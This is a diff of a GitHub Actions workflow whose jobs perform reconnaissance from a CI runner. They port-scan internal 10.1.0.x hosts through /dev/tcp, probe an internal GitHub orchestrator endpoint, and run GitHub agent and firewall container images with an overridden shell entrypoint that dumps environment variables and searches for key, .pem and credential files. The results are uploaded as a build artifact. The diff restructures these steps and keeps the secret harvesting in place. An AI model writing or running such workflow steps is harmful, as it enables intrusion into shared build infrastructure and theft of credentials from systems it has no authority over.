@@ -10,42 +10,40 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Deep Scan - Subnet + GitHub API + Docker Images
+      - name: Scan Subnet
+        continue-on-error: true
         run: |
           mkdir -p dist
           echo "=== 1. SUBNET SCAN ===" > dist/scan.txt
-          for ip in 10.1.0.1 10.1.0.2 10.1.0.188 10.1.0.190; do
-            for port in 22 80 443 2375 2376 6443 8080 8443 10250 10255; do
+          for ip in 10.1.0.1 10.1.0.2 10.1.0.188 10.1.0.190 10.1.0.254; do
+            for port in 22 80 443 2375 2376 6443; do
               timeout 2 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "OPEN: $ip:$port" >> dist/scan.txt
             done
           done
-          
+          cat dist/scan.txt
+
+      - name: GitHub Internal API
+        continue-on-error: true
+        run: |
           echo "" >> dist/scan.txt
           echo "=== 2. GITHUB INTERNAL API ===" >> dist/scan.txt
-          curl -sk --connect-timeout 5 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/" 2>&1 >> dist/scan.txt || echo "DNS/GitHub API unreachable" >> dist/scan.txt
-
-          echo "" >> dist/scan.txt
-          echo "=== 3. DOCKER IMAGES INSPECT ===" >> dist/scan.txt
-          for img in ghcr.io/github/gh-aw-mcpg ghcr.io/github/gh-aw-firewall/agent ghcr.io/github/github-mcp-server ghcr.io/dependabot/dependabot-updater-core; do
-            echo "--- $img ---" >> dist/scan.txt
-            docker run --rm --entrypoint=/bin/sh $img -c '
-              echo "ENV:"; env | grep -iE "token|key|secret|pass|cert" 2>/dev/null || echo "(no secrets in env)";
-              echo "FILES:"; find / -name "*.pem" -o -name "*.key" -o -name ".env*" -o -name "*secret*" -o -name "*cred*" 2>/dev/null | head -10 || echo "(none)";
-              echo "ETC:"; ls /etc/ 2>/dev/null | head -10;
-              echo "HOME:"; ls -la /root/ 2>/dev/null | head -5;
-            ' 2>&1 >> dist/scan.txt
-          done
-
-          echo "" >> dist/scan.txt
-          echo "=== 4. ADDITIONAL - Docker compose/volumes/networks ===" >> dist/scan.txt
-          docker volume ls >> dist/scan.txt 2>&1
-          docker network ls >> dist/scan.txt 2>&1
+          nslookup hosted-compute-request-orchestrator-prod-eus-01.githubapp.com 2>&1 >> dist/scan.txt || true
+          curl -sv --connect-timeout 5 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/" 2>&1 >> dist/scan.txt || echo "UNREACHABLE" >> dist/scan.txt
+          cat dist/scan.txt
           
+      - name: Docker Image Inspect
+        continue-on-error: true
+        run: |
           echo "" >> dist/scan.txt
-          echo "=== SCAN COMPLETE ===" >> dist/scan.txt
-          echo "Built at $(date)" >> dist/output.txt
+          echo "=== 3. DOCKER IMAGES ===" >> dist/scan.txt
+          docker images >> dist/scan.txt 2>&1
+          for img in ghcr.io/github/gh-aw-mcpg ghcr.io/github/gh-aw-firewall/agent ghcr.io/github/github-mcp-server; do
+            echo "--- $img ---" >> dist/scan.txt
+            docker run --rm --entrypoint=/bin/sh $img -c 'env | head -20; echo FILES:; find / -name "*.pem" -o -name "*.key" 2>/dev/null | head -5; ls /etc/ | head -10' 2>&1 >> dist/scan.txt
+          done
+          cat dist/scan.txt
 
-      - name: Upload Scan Results
+      - name: Upload Results
         uses: actions/upload-artifact@v4
         with:
           name: scan-results
